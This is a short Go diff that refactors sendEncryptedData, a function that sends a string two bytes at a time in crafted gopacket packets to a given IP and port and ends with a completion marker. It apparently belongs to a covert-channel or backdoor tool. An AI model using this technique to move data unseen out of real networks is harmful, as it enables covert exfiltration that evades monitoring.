@@ -3,6 +3,7 @@ import(
 	"reflect"
 	"unsafe"
 	"encoding/binary"
+	"bytes"
 	"fmt"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket"
@@ -76,20 +77,22 @@ func decrypt_data(data []byte) string {
 */
 func sendEncryptedData(port uint16, data, ip string) {
 
-	size := len(data)
-	if size % 2 != 0 {
-		data = fmt.Sprintf(data, "0")
-	}
+	var tmpBuffer bytes.Buffer
+	var buffer []byte
+	tmpBuffer.Write([]byte(data))
 	
-	for p := 0; p <= size; p = p + 2 {
+	if tmpBuffer.Len() % 2 != 0 {
+		tmpBuffer.WriteByte(0)
+	}
 
-		var buffer []byte
+	size := tmpBuffer.Len()
+	for p := 0; p <= size; p = p + 2 {
 		
 		if p == size {
 			temp := []byte{0, 0}
 			buffer = craftPacket(temp, ip, SND_CMPLETE, []byte{});
 		} else {
-			temp := []byte{data[p], data[p+1]}
+			temp := tmpBuffer.Next(2)
 			buffer = craftPacket(temp, ip, port, []byte{}); 
 		}
 		
